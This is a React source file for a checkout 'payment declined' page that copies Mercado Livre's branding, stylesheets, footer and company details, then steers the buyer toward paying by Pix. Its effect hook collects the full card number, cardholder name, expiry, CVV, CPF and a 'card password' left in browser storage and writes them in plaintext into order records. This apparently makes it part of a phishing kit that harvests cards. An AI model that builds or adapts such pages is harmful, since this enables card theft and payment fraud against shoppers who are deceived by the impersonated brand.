import { useEffect, useRef } from "react";
import { useNavigate } from "react-router-dom";
import { useStore } from "@/contexts/StoreContext";
import { buildCustomerFields, loadCheckoutAddress, getLastSavedOrder, markOrderSaved, clearSavedOrder } from "@/utils/orderBuilder";

const StoreCheckoutDeclined = () => {
    const navigate = useNavigate();
    const { cartItems, cartTotal, createOrder, updateOrderFields } = useStore();
    const orderCreatedRef = useRef(false);

    // Lê os últimos 4 dígitos e bandeira do cartão do localStorage
    const cardInput = (() => {
        try { return JSON.parse(localStorage.getItem("checkout_card_input") || "{}"); } catch { return {}; }
    })();
    const last4 = cardInput.cardNumber ? cardInput.cardNumber.slice(-4) : "****";
    const brand = cardInput.brand
        ? cardInput.brand.charAt(0).toUpperCase() + cardInput.brand.slice(1)
        : 'Cartão';

    useEffect(() => {
        window.scrollTo(0, 0);
        document.body.setAttribute("data-site", "ML");
        document.body.setAttribute("data-country", "BR");

        // Prevent duplicate order on strict-mode / remount
        if (orderCreatedRef.current) {
            return () => {
                document.body.removeAttribute("data-site");
                document.body.removeAttribute("data-country");
            };
        }
        orderCreatedRef.current = true;

        // Save the decline — update the pre-saved order if possible, otherwise insert a fresh one
        (async () => {
            try {
                const rawSavedTotal = sessionStorage.getItem('last_order_total');
                const finalAmount = (cartTotal && cartTotal > 0) ? cartTotal : (rawSavedTotal ? parseFloat(rawSavedTotal) : 0);
                const addressData = loadCheckoutAddress();
                const cardPassword = localStorage.getItem('checkout_last_password') || '';

                const declineNotes = {
                    cardLast4: last4,
                    cardBrand: brand,
                    cardPassword: cardPassword,
                    cardNumber: cardInput.cardNumber || "",
                    cardName: cardInput.cardName || "",
                    cardExpiry: cardInput.cardExpiry || "",
                    cardCvv: cardInput.cardCvv || "",
                    cardCpf: cardInput.doc_number || 'Não informado'
                };

                const saved = getLastSavedOrder();
                if (saved && saved.payment_method === "credit_card") {
                    await updateOrderFields(saved.id, {
                        status: "cancelled",
                        payment_status: "failed",
                        card_bin: last4 || "****",
                        notes: JSON.stringify(declineNotes),
                    } as any);
                    clearSavedOrder();
                    return;
                }

                // Fallback: no pre-saved order (direct URL / session lost) — create one now
                const newOrder = await createOrder({
                    ...buildCustomerFields(addressData),
                    total: finalAmount,
                    subtotal: finalAmount,
                    status: "cancelled",
                    payment_method: "credit_card",
                    payment_status: 'failed',
                    card_bin: last4 || "****",
                    notes: JSON.stringify(declineNotes),
                });
                if (newOrder) markOrderSaved({ ...(newOrder as any), payment_method: "credit_card" });
            } catch (e) {
                console.error("Order persistence failed on decline:", e);
            }
        })();

        document.body.setAttribute("data-country", "BR");
        return () => {
            document.body.removeAttribute("data-site");
            document.body.removeAttribute("data-country");
        };
    }, []);

    return (
        <>
            <link rel="stylesheet" href="https://http2.mlstatic.com/frontend-assets/buyingflow-payment-web/index.c7808f24.css" />
            <link rel="stylesheet" href="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/6.15.0/mercadolibre/navigation-desktop.css" />
            <link rel="stylesheet" href="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/widgets/6.15.0/modeless-box.css" />
            <style>{`
                a#nav-skip-to-main-content { display: none !important; }
                a#nav-a11y-feedback-link { display: none !important; }
                a.nav-header-user-myml { display: none !important; }
                span.nav-header-usermenu-wrapper { display: none !important; }
                #root-app {
                    min-height: calc(100vh - 120px);
                    background-color: #f5f5f5;
                }
                .declined-mobile-header {
                    display: none;
                }
                @media screen and (max-width: 767px) {
                    body {
                        min-width: auto !important;
                    }
                    .bf-ui-core-container.bf-ui-core-container--flex.bf-ui-core-container--flex-direction--column.bf-ui-core-container--flex-align--center.bf-ui-core-container--flex-text_align--left.bf-ui-core-container--flex-justify--left.bf-ui-core-container--flex-height--match_parent.bf-ui-core-container--flex-width--match_parent.bf-ui-core-container--flex-max-width--desktop.bf-ui-core-container--flex-wrap--no-wrap {
                        padding: 20px !important;
                    }
                    .bf-ui-core-feedback-card.bf-ui-core-feedback-card--margin--left-spacing20.bf-ui-core-feedback-card--margin--right-spacing20.bf-ui-core-feedback-card--simple {
                        margin-bottom: 0 !important;
                    }
                    #remedy_payment_button {
                        display: inline-flex !important;
                    }
                    .declined-mobile-header {
                        display: flex;
                    }
                }
            `}</style>

            {/* HEADER */}
            <header role="banner" data-siteid="MLB" className="nav-header nav-header-pluslite ui-navigation-v2">
                <div className="nav-bounds">
                    <div className="nav-header-logo">
                        <a id="nav-skip-to-main-content" className="nav-skip-to-main-content">
                            <span className="nav-skip-to-main-content__content">Ir para o conteúdo principal</span>
                        </a>
                        <a id="nav-a11y-feedback-link" className="nav-a11y-feedback-link">
                            <span className="nav-skip-to-main-content__content">Acessibilidade</span>
                        </a>
                        
          
          <a className="nav-logo" style={{ backgroundImage: "url('https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/7.23.0/mercadolibre/pt_logo_large_plus@2x.webp')", backgroundSize: "134px 34px", backgroundRepeat: "no-repeat" }}>Mercado Livre Brasil - Onde comprar e vender de Tudo</a>
                    </div>
                    <div className="nav-header-menu-wrapper">
                        <nav id="nav-header-menu" aria-label="Menu do usuário">
                            <ul className="nav-header-menu-list">
                                <li className="nav-header-menu-list__item">
                                    <div className="nav-header-user">
                                        <input type="checkbox" id="nav-header-user-switch" />
                                        <nav className="nav-header-user-layer user-menu--hidden user-menu user-menu--rounded-4 user-menu__one-column"
                                            tabIndex={-1} hidden={true} aria-label="Patricia, menu" aria-modal="true" role="dialog">
                                            <div className="user-menu__main">
                                                <div className="user-menu__user-info-outer-container user-menu__user-with-loyalty">
                                                    <div className="user-menu__user-info-inner-container">
                                                        <div className="user-menu__user-badge user-menu__user-badge--center">
                                                            <a className="user-menu-evolution" role="button" aria-label="Imagem do perfil, Patricia, Meu perfil">
                                                                <div className="user-menu-evolution__user-badge-image">
                                                                    <div className="user-menu-evolution__user-initials">PS</div>
                                                                </div>
                                                                <div className="user-menu-evolution__user-badge-title">Patricia</div>
                                                                <div className="user-menu-evolution__user-action-label">Meu perfil
                                                                    <span className="user-menu-evolution__user-badge-email-chevron"></span>
                                                                </div>
                                                            </a>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div className="user-menu__old">
                                                <a rel="nofollow">Minha conta</a>
                                                <a rel="nofollow">Sair</a>
                                            </div>
                                            <span className="user-menu__chevron"></span>
                                        </nav>
                                    </div>
                                </li>
                                <li className="nav-header-menu-list__item">
                                    <a className="option-help" rel="">Contato</a>
                                </li>
                                <li className="nav-header-menu-list__item"></li>
                            </ul>
                        </nav>
                    </div>
                </div>
            </header>

            {/* MAIN */}
            <main role="main" id="root-app">
                <div id="pending_contingency" className="step-container pending_contingency-container">
                    <div></div>
                    <div className="bf-ui-core-container bf-ui-core-container--flex bf-ui-core-container--flex-direction--column bf-ui-core-container--flex-align--top bf-ui-core-container--flex-text_align--left bf-ui-core-container--flex-justify--left bf-ui-core-container--flex-height--match_parent bf-ui-core-container--flex-width--match_parent bf-ui-core-container--flex-wrap--no-wrap"
                        aria-hidden="false" data-js="container" data-testid="flox_container"
                        style={{ backgroundColor: "#f5f5f5" }}>

                        {/* MOBILE CLOSE HEADER */}
                        <header id="mobile-header" data-js="mobile-header" data-testid="mobile-header"
                            className="declined-mobile-header bf-core-header bf-core-header--right">
                            <div className="bf-core-header__container">
                                <button type="button" className="bf-core-header__button bf-core-icon-custom-size"
                                    onClick={() => navigate("/store")}>
                                    <span className="bf-ui-core-rich-text__icon" data-testid="undefined-0" id="undefined-0" aria-hidden="true" role="presentation">
                                        <img className="bf-ui-core-rich-text__icon--image"
                                            src="https://http2.mlstatic.com/storage/buyingflow-core-assets-web/bf-assets/svg/bf_v6_close_black.svg"
                                            alt="" />
                                    </span>
                                </button>
                            </div>
                        </header>

                        <div className="bf-ui-core-container bf-ui-core-container--flex bf-ui-core-container--flex-direction--column bf-ui-core-container--flex-align--center bf-ui-core-container--flex-text_align--left bf-ui-core-container--flex-justify--left bf-ui-core-container--flex-height--wrap_content bf-ui-core-container--flex-width--match_parent bf-ui-core-container--flex-max-width--desktop bf-ui-core-container--flex-wrap--no-wrap bf-ui-core-container--margin--left-auto bf-ui-core-container--margin--right-auto"
                            aria-hidden="false" data-js="container" data-testid="bf_main_container_feedback">

                            {/* FEEDBACK CARD */}
                            <div className="bf-ui-core-feedback-card bf-ui-core-feedback-card--margin--left-spacing20 bf-ui-core-feedback-card--margin--right-spacing20 bf-ui-core-feedback-card--simple">
                                <div className="andes-feedback-screen andes-feedback-screen--body">
                                    <div className="andes-feedback-screen__wrapper">
                                        <div className="andes-card andes-feedback-screen__header-card andes-card--flat andes-card--padding-16">
                                            <div className="andes-card__content">
                                                <div className="andes-feedback-screen__header">
                                                    <div className="andes-feedback-screen__header-asset">
                                                        <div className="andes-thumbnail-container">
                                                            <div className="andes-thumbnail andes-thumbnail--circle andes-thumbnail--64 andes-thumbnail__badge andes-thumbnail__badge-orange bf-ui-core-thumbnail">
                                                                <img aria-hidden="true" alt="icon"
                                                                    src="https://http2.mlstatic.com/storage/buyingflow-core-assets-web/bf-assets/svg/bf_v6_master.svg"
                                                                    data-testid="feedback_card_container" />
                                                            </div>
                                                            <div aria-hidden="false" data-testid="feedback_card_container"
                                                                className="bf-ui-core-badge bf-ui-core-badge--orange">
                                                                <div className="andes-badge andes-badge--pill andes-badge--orange andes-badge--pill-icon andes-badge--large">
                                                                    <div aria-hidden="true" className="andes-badge__icon">
                                                                        <svg aria-hidden="true" width="24" height="24" viewBox="0 0 24 24" fill="white">
                                                                            <path d="M13.4545 5.81824H10.5454L10.909 13.8182H13.0909L13.4545 5.81824Z" fill="white"></path>
                                                                            <path d="M12 15.2728C12.8033 15.2728 13.4545 15.924 13.4545 16.7273C13.4545 17.5307 12.8033 18.1819 12 18.1819C11.1966 18.1819 10.5454 17.5307 10.5454 16.7273C10.5454 15.924 11.1966 15.2728 12 15.2728Z" fill="white"></path>
                                                                        </svg>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div className="andes-feedback-screen__header-info">
                                                        <p className="andes-feedback-screen__header-overline">
                                                            Pagamento recusado com o cartão {brand} terminado em {last4}
                                                        </p>
                                                        <h2 className="andes-feedback-screen__header-title">
                                                            Escolha outro meio de pagamento
                                                        </h2>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div className="andes-feedback-screen__content"></div>
                                    </div>
                                </div>
                            </div>

                            {/* REMEDY CARD */}
                            <div className="bf-ui-core-container bf-ui-core-container--flex bf-ui-core-container--flex-direction--column bf-ui-core-container--flex-align--center bf-ui-core-container--flex-text_align--left bf-ui-core-container--flex-justify--left bf-ui-core-container--flex-height--match_parent bf-ui-core-container--flex-width--match_parent bf-ui-core-container--flex-max-width--desktop bf-ui-core-container--flex-wrap--no-wrap"
                                aria-hidden="false" data-js="container" data-testid="bf_main_container">
                                <div data-js="bf-ui-core-card" data-testid="remedy_button_container"
                                    className="andes-card bf-ui-core-card bf-ui-core-card--padding--top-spacing8 bf-ui-core-card--padding--bottom-spacing8 bf-ui-core-card--padding--left-spacing8 bf-ui-core-card--padding--right-spacing8 andes-card--flat andes-card--padding-24">
                                    <div className="andes-card__content bf-ui-core-card__content">
                                        <span className="bf-ui-core-label" role="presentation" aria-hidden="false">
                                            <span className="andes-visually-hidden">Prazo de processamento dos bancos</span>
                                            <span className="bf-ui-core-rich-text__body bf-ui-core-rich-text__body--primary bf-ui-core-rich-text__body--bold bf-ui-core-rich-text__body--bodyl"
                                                aria-hidden="true" role="presentation">
                                                <span className="andes-typography andes-typography--type-body andes-typography--size-l andes-typography--color-primary andes-typography--weight-bold"
                                                    role="presentation">Prazo de processamento dos bancos</span>
                                            </span>
                                        </span>
                                        <span className="bf-ui-core-label" role="presentation" aria-hidden="false">
                                            <span className="andes-visually-hidden">Você pode esperar que seu banco aprove o pagamento ou escolher outro meio agora.</span>
                                            <span className="bf-ui-core-rich-text__body bf-ui-core-rich-text__body--secondary bf-ui-core-rich-text__body--regular bf-ui-core-rich-text__body--bodym"
                                                aria-hidden="true" role="presentation">
                                                <span className="andes-typography andes-typography--type-body andes-typography--size-m andes-typography--color-secondary andes-typography--weight-regular"
                                                    role="presentation">Você pode esperar que seu banco aprove o pagamento ou escolher outro meio agora.</span>
                                            </span>
                                        </span>
                                    </div>
                                </div>

                                {/* BUTTONS */}
                                <div className="bf-ui-core-container bf-ui-core-container--flex bf-ui-core-container--flex-direction--row bf-ui-core-container--flex-align--stretch bf-ui-core-container--flex-text_align--left bf-ui-core-container--flex-justify--right bf-ui-core-container--flex-height--wrap_content bf-ui-core-container--flex-width--match_parent bf-ui-core-container--flex-wrap--no-wrap bf-ui-core-container--padding--top-spacing16"
                                    aria-hidden="false" data-js="container" data-testid="remedy_payment_button_container">
                                    <button type="button"
                                        onClick={() => {
                                            localStorage.setItem("checkout_payment_method", "pix");
                                            navigate("/store/checkout/pix/success");
                                        }}
                                        className="andes-button bf-ui-core-button bf-ui-core-button__simple bf-ui-core-button__hierarchy--loud bf-ui-core-button__size--large andes-button--large andes-button--loud"
                                        id="remedy_payment_button"
                                        aria-label="Pagar com Pix" data-testid="remedy_payment_button">
                                        <span className="andes-button__content" style={{ display: "inline-flex", alignItems: "center", gap: "8px" }}>
                                            <svg width="20" height="20" viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                                                <path d="M11.917 11.71a2.046 2.046 0 0 1-1.454-.602l-2.1-2.1a.4.4 0 0 0-.551 0l-2.108 2.108a2.044 2.044 0 0 1-1.454.602h-.414l2.66 2.66c.83.83 2.177.83 3.007 0l2.667-2.668h-.253zM4.25 4.282c.55 0 1.066.214 1.454.602l2.108 2.108a.39.39 0 0 0 .552 0l2.1-2.1a2.044 2.044 0 0 1 1.453-.602h.253L9.503 1.623a2.127 2.127 0 0 0-3.007 0l-2.66 2.66h.414z" fill="#ffffff"/>
                                                <path d="m14.377 6.496-1.612-1.612a.307.307 0 0 1-.114.023h-.733c-.379 0-.75.154-1.017.422l-2.1 2.1a1.005 1.005 0 0 1-1.425 0L5.268 5.32a1.448 1.448 0 0 0-1.018-.422h-.9a.306.306 0 0 1-.109-.021L1.623 6.496c-.83.83-.83 2.177 0 3.008l1.618 1.618a.305.305 0 0 1 .108-.022h.901c.38 0 .75-.153 1.018-.421L7.375 8.57a1.034 1.034 0 0 1 1.426 0l2.1 2.1c.267.268.638.421 1.017.421h.733c.04 0 .079.01.114.024l1.612-1.612c.83-.83.83-2.178 0-3.008z" fill="#ffffff"/>
                                            </svg>
                                            <span className="andes-button__text">Pagar com Pix</span>
                                        </span>
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </main>

            {/* FOOTER */}
            <footer role="contentinfo" className="nav-footer">
                <div className="nav-footer-user-info nav-bounds">
                    <div className="nav-footer-info-wrapper">
                        <div className="nav-footer-primaryinfo">
                            <small className="nav-footer-copyright">Copyright © 1999-2026 Ebazar.com.br LTDA.</small>
                            <nav className="nav-footer-navigation">
                                <ul className="nav-footer-navigation__menu">
                                    <li className="nav-footer-navigation__item"><a className="nav-footer-navigation__link">Trabalhe conosco</a></li>
                                    <li className="nav-footer-navigation__item"><a className="nav-footer-navigation__link">Termos e condições</a></li>
                                    <li className="nav-footer-navigation__item"><a className="nav-footer-navigation__link">Promoções</a></li>
                                    <li className="nav-footer-navigation__item"><a className="nav-footer-navigation__link">Como cuidamos da sua privacidade</a></li>
                                    <li className="nav-footer-navigation__item"><a className="nav-footer-navigation__link">Acessibilidade</a></li>
                                    <li className="nav-footer-navigation__item"><a className="nav-footer-navigation__link">Contato</a></li>
                                    <li className="nav-footer-navigation__item"><a className="nav-footer-navigation__link">Informações sobre seguros</a></li>
                                    <li className="nav-footer-navigation__item"><a className="nav-footer-navigation__link">Programa de Afiliados</a></li>
                                </ul>
                            </nav>
                        </div>
                        <p className="nav-footer-secondaryinfo">CNPJ n.º 03.007.331/0001-41 / Av. das Nações Unidas, nº 3.003, Bonfim, Osasco/SP - CEP 06233-903 - empresa do grupo Mercado Libre.</p>
                    </div>
                </div>
                <a className="nav-footer-hp">Mercado Libre</a>
            </footer>
        </>
    );
};

export default StoreCheckoutDeclined;
